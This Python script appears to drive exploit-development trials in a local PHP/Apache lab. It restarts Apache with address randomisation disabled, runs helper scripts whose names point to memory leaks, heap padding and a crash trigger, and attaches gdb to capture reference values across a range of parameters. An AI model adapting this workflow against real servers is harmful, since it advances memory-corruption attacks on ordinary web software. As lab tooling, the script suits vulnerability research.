#!/usr/bin/env python3
import subprocess,time,sys
def sh(c,timeout=60): return subprocess.run(c,shell=True,cwd='/home/debian/php-lab',capture_output=True,text=True,timeout=timeout)
def restart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.25)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.35)
def child():
    out=sh('pgrep -f "^/usr/sbin/apache2 -k start"').stdout.split()
    return out[-1] if len(out)>=2 else None
def trial(P,N):
    restart()
    sh("python3 send_a_leak2.py 1001 12 >/dev/null 2>&1"); time.sleep(0.1)
    sh("python3 b_numleak2.py 892 1 0x1000 >/dev/null 2>&1"); time.sleep(0.1)
    sh("python3 send_a_leak3.py 1001 5 39 12 17 >/dev/null 2>&1"); time.sleep(0.1)
    sh("python3 b_target.py 443 16 983 >/dev/null 2>&1"); time.sleep(0.1)
    w=child()
    if not w: return "nochild"
    sh(f"python3 send_a_pad.py 17 19 3 12 " + " ".join(["7:7"]*P) + " >/dev/null 2>&1",40); time.sleep(0.15)
    log=f"/tmp/c7_{N}.log"; sh(f"rm -f {log}")
    sh(f"(sudo -n gdb -q -p {w} -batch -x refq.gdb >{log} 2>&1 &) ; sleep 0.5")
    sh(f"python3 b_crash7.py {N} >/dev/null 2>&1",30); time.sleep(0.6)
    sh(f"sudo -n pkill -f 'gdb -q -p {w}' >/dev/null 2>&1")
    return sh(f"grep -E 'REF r=' {log}").stdout.strip() or "noREF"
for n in range(8,26):
    print(f"N={n} {trial(6,n)}",flush=True)
